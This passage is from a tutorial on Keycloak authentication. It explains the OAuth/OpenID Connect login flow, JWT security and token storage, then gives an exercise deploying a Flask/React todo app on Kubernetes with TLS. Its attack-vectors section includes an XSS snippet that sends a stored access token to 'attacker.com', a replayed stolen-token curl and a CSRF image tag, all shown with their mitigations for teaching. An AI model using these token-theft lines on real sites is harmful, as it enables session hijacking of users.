1. **OAuth 2.0 Authorization Server**
   - Issues access tokens
   - Manages authorization codes
   - Handles token refresh

2. **OpenID Connect Provider**
   - Issues ID tokens
   - Provides UserInfo endpoint
   - Implements discovery (/.well-known/openid-configuration)

3. **JWT Token Issuer**
   - Signs tokens with RSA keys
   - Publishes public keys at `/certs` endpoint
   - Supports token introspection

4. **User Federation**
   - LDAP/Active Directory integration
   - Custom user storage providers
   - Social login (Google, GitHub, etc.)

5. **Additional Features**
   - Multi-factor authentication (TOTP, WebAuthn)
   - Single Sign-On (SSO) across applications
   - User self-registration and account management
   - Fine-grained authorization (policies, permissions)
   - Event logging and auditing

### Complete Authentication Flow with Keycloak

Here's what happens when a user logs into the todo app:

```
┌─────────┐         ┌─────────┐         ┌──────────┐         ┌─────────┐
│ Browser │         │  React  │         │ Keycloak │         │  Flask  │
│         │         │ Frontend│         │          │         │   API   │
└────┬────┘         └────┬────┘         └────┬─────┘         └────┬────┘
     │                   │                    │                    │
     │ 1. Visit app      │                    │                    │
     ├──────────────────>│                    │                    │
     │                   │                    │                    │
     │                   │ 2. keycloak.init() │                    │
     │                   │    onLoad: login-required              │
     │                   ├───────────────────>│                    │
     │                   │                    │                    │
     │ 3. Redirect to /auth?response_type=code&client_id=...      │
     │<──────────────────┴────────────────────┤                    │
     │                                        │                    │
     │ 4. GET /auth (show login page)         │                    │
     ├───────────────────────────────────────>│                    │
     │                                        │                    │
     │ 5. Login form                          │                    │
     │<───────────────────────────────────────┤                    │
     │                                        │                    │
     │ 6. POST credentials                    │                    │
     ├───────────────────────────────────────>│                    │
     │                                        │                    │
     │                         7. Authenticate user                │
     │                            Check password                   │
     │                            Create session                   │
     │                                        │                    │
     │ 8. Redirect with code                  │                    │
     │    http://localhost:3000/?code=ABC123  │                    │
     │<───────────────────────────────────────┤                    │
     │                                        │                    │
     │ 9. Code in URL                         │                    │
     ├──────────────────>│                    │                    │
     │                   │                    │                    │
     │                   │ 10. Exchange code for tokens            │
     │                   │     POST /token    │                    │
     │                   ├───────────────────>│                    │
     │                   │                    │                    │
     │                   │              11. Validate code          │
     │                   │                  Issue tokens           │
     │                   │                  - Access (JWT)         │
     │                   │                  - ID (JWT)             │
     │                   │                  - Refresh (JWT)        │
     │                   │                    │                    │
     │                   │ 12. Return tokens  │                    │
     │                   │<───────────────────┤                    │
     │                   │                    │                    │
     │ 13. Store tokens in memory             │                    │
     │    Parse ID token to get user info     │                    │
     │                   │                    │                    │
     │ 14. Show app UI   │                    │                    │
     │<──────────────────┤                    │                    │
     │                   │                    │                    │
     │ 15. Click "Add Todo"                   │                    │
     ├──────────────────>│                    │                    │
     │                   │                    │                    │
     │                   │ 16. POST /api/todos                     │
     │                   │     Authorization: Bearer <access_token>│
     │                   ├────────────────────────────────────────>│
     │                   │                    │                    │
     │                   │                    │  17. Extract token │
     │                   │                    │      Get kid from  │
     │                   │                    │      header        │
     │                   │                    │                    │
     │                   │                    │  18. Fetch public  │
     │                   │                    │      keys          │
     │                   │                    │<───────────────────┤
     │                   │                    │                    │
     │                   │                    │  19. Public keys   │
     │                   │                    ├───────────────────>│
     │                   │                    │                    │
     │                   │                    │  20. Verify signature
     │                   │                    │      Validate claims
     │                   │                    │      Extract roles  │
     │                   │                    │                    │
     │                   │                    │  21. Authorized!   │
     │                   │                    │      Create todo   │
     │                   │                    │                    │
     │                   │ 22. 201 Created    │                    │
     │                   │<────────────────────────────────────────┤
     │                   │                    │                    │
     │ 23. Show new todo │                    │                    │
     │<──────────────────┤                    │                    │
     ▼                   ▼                    ▼                    ▼
```

### Security Considerations

#### Why HTTPS is Critical

JWTs are **signed** (tamper-proof) but **not encrypted** (anyone can decode):

```bash
# Anyone can decode a JWT!
echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

**Without HTTPS:**
- Tokens can be intercepted in transit
- Attackers can steal tokens and impersonate users
- Man-in-the-middle attacks are trivial

**Always use HTTPS in production!**

#### Token Storage Security

| Location | Security | Notes |
|----------|----------|-------|
| **Memory** | ✅ Best | Lost on refresh, requires refresh token flow |
| **SessionStorage** | ⚠️ OK | Cleared on tab close, vulnerable to XSS |
| **LocalStorage** | ❌ Dangerous | Persists, highly vulnerable to XSS |
| **Cookie (HttpOnly)** | ✅ Good | Not accessible to JavaScript, requires backend |

**Our todo app uses memory** - most secure for SPAs.

#### Common Attack Vectors

**1. Cross-Site Scripting (XSS)**
```javascript
// Attacker injects malicious script
<script>
  const token = localStorage.getItem('access_token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

**Mitigation:**
- Store tokens in memory only
- Use Content Security Policy (CSP)
- Sanitize all user input
- Use frameworks that escape by default (React does this)

**2. Token Replay Attack**
```bash
# Attacker intercepts token and reuses it
curl -H "Authorization: Bearer stolen_token" https://api.example.com/admin
```

**Mitigation:**
- Short token lifetimes (5-15 minutes)
- Token binding (bind to TLS session)
- Audience validation (token only for specific API)

**3. CSRF with Tokens**
```html
<!-- Attacker's page -->
<img src="https://api.example.com/delete-account?token=..." />
```

**Mitigation:**
- Use Authorization header (not cookies or query params)
- Validate origin headers
- Use CSRF tokens for state-changing operations

### Debugging JWT Tokens

**Decode token without verification:**
```bash
# Header
echo "eyJhbGc..." | base64 -d | jq

# Payload
echo "eyJzdWI..." | base64 -d | jq
```

**Verify token signature:**
```python
import jwt
import requests

# Get Keycloak's public keys
keys_url = "https://keycloak.../realms/myapp/protocol/openid-connect/certs"
keys = requests.get(keys_url).json()

# Find key and verify
for key in keys['keys']:
    if key['kid'] == token_kid:
        public_key = jwt.algorithms.RSAAlgorithm.from_jwk(key)
        decoded = jwt.decode(token, public_key, algorithms=['RS256'])
```

**Useful tools:**
- **jwt.io** - Decode and verify tokens in browser
- **openssl** - Verify signatures manually
- **Keycloak Admin Console** - View/revoke tokens
- **Browser DevTools** - Inspect network requests

---

## Security Best Practices

### For Production

- [ ] Change all default passwords
- [ ] Use strong database passwords
- [ ] Use Let's Encrypt production certificates (`certIssuer: letsencrypt-prod`)
- [ ] Configure SMTP for password recovery emails
- [ ] Enable MFA for admin accounts
- [ ] Use HTTPS everywhere
- [ ] Set appropriate token lifetimes (access: 5min, refresh: 30 days)
- [ ] Enable event logging and auditing
- [ ] Backup database regularly
- [ ] Keep Keycloak updated

### Token Lifetimes

Recommended settings (in Realm Settings → Tokens):
- Access Token: 5 minutes (short-lived, frequently refreshed)
- SSO Session Idle: 30 minutes (logout if inactive)
- SSO Session Max: 10 hours (max session length)
- Refresh Token: 30 days (long-lived for mobile apps)

---

## Exercise: Deploy Todo App on Kubernetes with Production TLS

This exercise challenges you to deploy the complete todo application on LTU Rancher with production Let's Encrypt certificates.

### Overview

Deploy a full-stack authenticated application:
- **Keycloak** - Already running (from earlier in this tutorial)
- **Flask Backend API** - Containerized and deployed on K8s
- **React Frontend** - Containerized and deployed on K8s with HTTPS

### Prerequisites

- Keycloak running on `https://keycloak.ltu-m7011e-yourname.se`
- Realm `myapp` created
- Understanding of Docker and Kubernetes from previous tutorials

### Step 1: Prepare the Backend

**1.1 Create Dockerfile for Flask API**

Create `todo-app-example/backend/Dockerfile`:
```dockerfile
FROM python:3.11-slim

WORKDIR /app

# Install dependencies
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application code
COPY app.py .

# Run as non-root user
RUN useradd -m -u 1000 appuser && chown -R appuser:appuser /app
USER appuser

EXPOSE 5001

CMD ["python", "app.py"]
```

**1.2 Create requirements.txt**

Create `todo-app-example/backend/requirements.txt`:
```
Flask==3.0.0
flask-cors==4.0.0
PyJWT==2.8.0
cryptography==41.0.7
requests==2.31.0
```

**1.3 Update Configuration for Production**

Edit `app.py` to use environment variables:
```python
import os

# Keycloak configuration from environment
KEYCLOAK_URL = os.getenv('KEYCLOAK_URL', 'https://keycloak.ltu-m7011e-yourname.se')
REALM = os.getenv('KEYCLOAK_REALM', 'myapp')
CLIENT_ID = os.getenv('KEYCLOAK_CLIENT_ID', 'my-frontend-app')
INSECURE = os.getenv('INSECURE', 'False').lower() == 'true'

# CORS - allow your frontend domain
FRONTEND_URL = os.getenv('FRONTEND_URL', 'https://todo.ltu-m7011e-yourname.se')
CORS(app, resources={
    r"/api/*": {
        "origins": [FRONTEND_URL],
        "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
        "allow_headers": ["Content-Type", "Authorization"]
    }
})
```

**1.4 Build and Push Docker Image**

```bash
cd todo-app-example/backend

# Build image
docker build -t todo-backend:latest .

# Tag for your registry (if using private registry)
docker tag todo-backend:latest registry.example.com/todo-backend:latest

# Push to registry
docker push registry.example.com/todo-backend:latest
```

### Step 2: Deploy Backend on Kubernetes

**2.1 Create Backend Deployment**

Create `todo-app-example/k8s/backend-deployment.yaml`:
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: todo-backend
  namespace: yournamespace
spec:
  replicas: 2
  selector:
    matchLabels:
      app: todo-backend
  template:
    metadata:
      labels:
        app: todo-backend
    spec:
      containers:
      - name: todo-backend
        image: registry.example.com/todo-backend:latest
        ports:
        - containerPort: 5001
        env:
        - name: KEYCLOAK_URL
          value: "https://keycloak.ltu-m7011e-yourname.se"
        - name: KEYCLOAK_REALM
          value: "myapp"
        - name: KEYCLOAK_CLIENT_ID
          value: "my-frontend-app"
        - name: FRONTEND_URL
          value: "https://todo.ltu-m7011e-yourname.se"
        - name: INSECURE
          value: "false"  # Production TLS
        resources:
          requests:
            cpu: 100m
            memory: 128Mi
          limits:
            cpu: 500m
            memory: 512Mi
        livenessProbe:
          httpGet:
            path: /
            port: 5001
          initialDelaySeconds: 10
          periodSeconds: 30
        readinessProbe:
          httpGet:
            path: /
            port: 5001
          initialDelaySeconds: 5
          periodSeconds: 10
---
apiVersion: v1
kind: Service
metadata:
  name: todo-backend
  namespace: yournamespace
spec:
  selector:
    app: todo-backend
  ports:
  - protocol: TCP
    port: 5001
    targetPort: 5001
  type: ClusterIP
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: todo-backend
  namespace: yournamespace
  annotations:
    cert-manager.io/cluster-issuer: letsencrypt-prod
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
spec:
  ingressClassName: nginx
  tls:
  - hosts:
    - todo-api.ltu-m7011e-yourname.se
    secretName: todo-backend-tls
  rules:
  - host: todo-api.ltu-m7011e-yourname.se
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: todo-backend
            port:
              number: 5001
```

**2.2 Deploy Backend**

```bash
kubectl apply -f todo-app-example/k8s/backend-deployment.yaml

# Verify deployment
kubectl get pods -n yournamespace -l app=todo-backend
kubectl get ingress -n yournamespace

# Test backend
curl https://todo-api.ltu-m7011e-yourname.se/
```

### Step 3: Prepare the Frontend

**3.1 Create Dockerfile for React App**

Create `todo-app-example/frontend/Dockerfile`:
```dockerfile
# Build stage
FROM node:18-alpine AS build

WORKDIR /app

# Install dependencies
COPY package*.json ./
RUN npm ci

# Copy source code
COPY . .

# Build production bundle
RUN npm run build

# Production stage
FROM nginx:alpine

# Copy built app to nginx
COPY --from=build /app/build /usr/share/nginx/html

# Copy nginx config
COPY nginx.conf /etc/nginx/conf.d/default.conf

EXPOSE 80

CMD ["nginx", "-g", "daemon off;"]
```

**3.2 Create nginx Configuration**

Create `todo-app-example/frontend/nginx.conf`:
```nginx
server {
    listen 80;
    server_name localhost;
    root /usr/share/nginx/html;
    index index.html;

    # Enable gzip compression
    gzip on;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

    # SPA routing - all routes go to index.html
    location / {
        try_files $uri $uri/ /index.html;
    }

    # Cache static assets
    location /static/ {
        expires 1y;
        add_header Cache-Control "public, immutable";
    }

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
}
```

**3.3 Update Frontend Configuration**

Edit `src/keycloak-config.js`:
```javascript
export const keycloakConfig = {
  url: 'https://keycloak.ltu-m7011e-yourname.se',
  realm: 'myapp',
  clientId: 'my-frontend-app'
};
```

Edit `src/api.js`:
```javascript
// Use production API URL
const API_BASE_URL = 'https://todo-api.ltu-m7011e-yourname.se/api';
```

**3.4 Build and Push Docker Image**

```bash
cd todo-app-example/frontend

# Build image
docker build -t todo-frontend:latest .

# Tag and push
docker tag todo-frontend:latest registry.example.com/todo-frontend:latest
docker push registry.example.com/todo-frontend:latest
```

### Step 4: Deploy Frontend on Kubernetes

**4.1 Create Frontend Deployment**

Create `todo-app-example/k8s/frontend-deployment.yaml`:
```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: todo-frontend
  namespace: yournamespace
spec:
  replicas: 2
  selector:
    matchLabels:
      app: todo-frontend
  template:
    metadata:
      labels:
        app: todo-frontend
    spec:
      containers:
      - name: todo-frontend
        image: registry.example.com/todo-frontend:latest
        ports:
        - containerPort: 80
        resources:
          requests:
            cpu: 50m
            memory: 64Mi
          limits:
            cpu: 200m
            memory: 256Mi
        livenessProbe:
          httpGet:
            path: /
            port: 80
          initialDelaySeconds: 10
          periodSeconds: 30
        readinessProbe:
          httpGet:
            path: /
            port: 80
          initialDelaySeconds: 5
          periodSeconds: 10
---
apiVersion: v1
kind: Service
metadata:
  name: todo-frontend
  namespace: yournamespace
spec:
  selector:
    app: todo-frontend
  ports:
  - protocol: TCP
    port: 80
    targetPort: 80
  type: ClusterIP
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: todo-frontend
  namespace: yournamespace
  annotations:
    cert-manager.io/cluster-issuer: letsencrypt-prod
    nginx.ingress.kubernetes.io/ssl-redirect: "true"
spec:
  ingressClassName: nginx
  tls:
  - hosts:
    - todo.ltu-m7011e-yourname.se
    secretName: todo-frontend-tls
  rules:
  - host: todo.ltu-m7011e-yourname.se
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: todo-frontend
            port:
              number: 80
```

**4.2 Deploy Frontend**

```bash
kubectl apply -f todo-app-example/k8s/frontend-deployment.yaml

# Verify deployment
kubectl get pods -n yournamespace -l app=todo-frontend
kubectl get ingress -n yournamespace

# Check TLS certificate
kubectl get certificate -n yournamespace
```

### Step 5: Update Keycloak Client

**5.1 Update Redirect URIs**

Update `create-client.py`:
```python
FRONTEND_URLS = [
    "https://todo.ltu-m7011e-yourname.se",
]
```

Run:
```bash
# Delete old client
python3 delete-client.py

# Create new client with production URL
python3 create-client.py
```

**5.2 Update CORS in Keycloak**

The client creation script automatically configures Web Origins, but verify in Keycloak Admin Console:
- Go to Clients → my-frontend-app
- Check "Web Origins" includes `https://todo.ltu-m7011e-yourname.se`

### Step 6: Test the Complete Application

**6.1 Access the Application**

Open browser: `https://todo.ltu-m7011e-yourname.se`

**6.2 Verify Functionality**

1. Click "Log In" button
2. You should be redirected to Keycloak login
3. Login with your test user
4. You should be redirected back to the todo app
5. Add a todo item
6. Verify it appears in the list
7. Toggle completion status
8. Delete a todo

**6.3 Verify Security**

Check browser developer tools:
- ✅ All requests use HTTPS
- ✅ Valid Let's Encrypt certificate
- ✅ Authorization header includes JWT token
- ✅ API calls to `https://todo-api.ltu-m7011e-yourname.se`

### Step 7: Bonus Challenges

1. **Add Horizontal Pod Autoscaling (HPA)**
   ```yaml
   apiVersion: autoscaling/v2
   kind: HorizontalPodAutoscaler
   metadata:
     name: todo-backend-hpa
   spec:
     scaleTargetRef:
       apiVersion: apps/v1
       kind: Deployment
       name: todo-backend
     minReplicas: 2
     maxReplicas: 10
     metrics:
     - type: Resource
       resource:
         name: cpu
         target:
           type: Utilization
           averageUtilization: 70
   ```

2. **Add Persistent Storage for Todos**
   - Replace in-memory storage with PostgreSQL
   - Create PersistentVolumeClaim
   - Update Flask app to use SQLAlchemy

3. **Implement Health Checks**
   - Add `/health` endpoint to Flask app
   - Configure advanced liveness/readiness probes

4. **Add Monitoring**
   - Deploy Prometheus and Grafana
   - Export metrics from Flask app
   - Create dashboards for request rate, latency, errors

5. **Deploy with Argo CD**
   - Create Argo CD Application manifest
   - Set up GitOps workflow
   - Implement automated deployments

6. **Add NetworkPolicies**
   - Restrict traffic between pods
   - Allow only frontend → backend communication
   - Allow only backend → Keycloak communication

### Deliverables

Submit:
- [ ] All Kubernetes YAML files
- [ ] Both Dockerfiles
- [ ] Screenshots of running application
- [ ] Screenshot of valid TLS certificate
- [ ] Output of `kubectl get all -n yournamespace`
- [ ] Brief report explaining your deployment choices

---

## Exercise: Secure Your Previous Projects

Now it's your turn! Add Keycloak authentication to one of your previous tutorial projects.

### Challenge Ideas

1. **Basics**: Add login/logout to your Tutorial 9 React app
2. **Intermediate**: Protect your Tutorial 1 Flask API with JWT validation
3. **Advanced**: Implement role-based access control in your project
4. **Expert**: Add social login and MFA

### Bonus Challenges

- Create custom login page theme
- Implement "Remember Me" functionality
- Add user self-registration with email verification
- Set up admin panel with user management

---

## Additional Resources

- [Keycloak Official Documentation](https://www.keycloak.org/documentation)
- [OAuth 2.0 Specification](https://oauth.net/2/)
- [OpenID Connect Specification](https://openid.net/connect/)
- [JWT.io Debugger](https://jwt.io/) - Decode and inspect JWTs
- [Keycloak Admin REST API](https://www.keycloak.org/docs-api/latest/rest-api/)

---

## Summary

You've learned how to:

✅ Deploy Keycloak on Kubernetes with PostgreSQL
✅ Create realms, users, and roles
✅ Configure client applications for web and mobile
✅ Integrate Keycloak with React (frontend) and Flask (backend)
✅ Implement role-based access control
✅ Add social login (GitHub, Google, etc.)
✅ Enable multi-factor authentication
✅ Validate JWT tokens in your API
✅ Handle token refresh and expiration

**Key Takeaway**: Keycloak provides enterprise-grade authentication with minimal code. Instead of building your own auth system (and making security mistakes), you get industry-standard protocols, best practices, and features out of the box.

## What's Next?

- Explore fine-grained authorization with policies and permissions
- Create custom authentication flows
- Set up user federation with LDAP/Active Directory
- Build a microservices architecture with centralized auth
- Learn about Keycloak clustering for high availability
